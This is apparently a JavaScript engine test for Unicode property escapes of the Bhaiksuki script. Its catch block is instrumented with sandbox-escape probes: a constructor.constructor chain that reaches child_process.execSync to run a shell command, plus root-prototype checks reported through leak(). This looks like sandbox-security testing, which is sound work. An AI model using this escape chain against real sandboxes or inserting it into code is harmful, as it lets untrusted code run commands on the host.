try {
    const matchSymbols = buildString({
        loneCodePoints: [],
        ranges: [
            [
                72704,
                72712
            ],
            [
                72714,
                72758
            ],
            [
                72760,
                72773
            ],
            [
                72784,
                72812
            ]
        ]
    });
    testPropertyEscapes(/^\p{Script_Extensions=Bhaiksuki}+$/u, matchSymbols, '\\p{Script_Extensions=Bhaiksuki}');
    testPropertyEscapes(/^\p{Script_Extensions=Bhks}+$/u, matchSymbols, '\\p{Script_Extensions=Bhks}');
    testPropertyEscapes(/^\p{scx=Bhaiksuki}+$/u, matchSymbols, '\\p{scx=Bhaiksuki}');
    testPropertyEscapes(/^\p{scx=Bhks}+$/u, matchSymbols, '\\p{scx=Bhks}');
    const nonMatchSymbols = buildString({
        loneCodePoints: [
            72713,
            72759
        ],
        ranges: [
            [
                56320,
                57343
            ],
            [
                0,
                56319
            ],
            [
                57344,
                72703
            ],
            [
                72774,
                72783
            ],
            [
                72813,
                1114111
            ]
        ]
    });
    testPropertyEscapes(/^\P{Script_Extensions=Bhaiksuki}+$/u, nonMatchSymbols, '\\P{Script_Extensions=Bhaiksuki}');
    testPropertyEscapes(/^\P{Script_Extensions=Bhks}+$/u, nonMatchSymbols, '\\P{Script_Extensions=Bhks}');
    testPropertyEscapes(/^\P{scx=Bhaiksuki}+$/u, nonMatchSymbols, '\\P{scx=Bhaiksuki}');
    testPropertyEscapes(/^\P{scx=Bhks}+$/u, nonMatchSymbols, '\\P{scx=Bhks}');
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}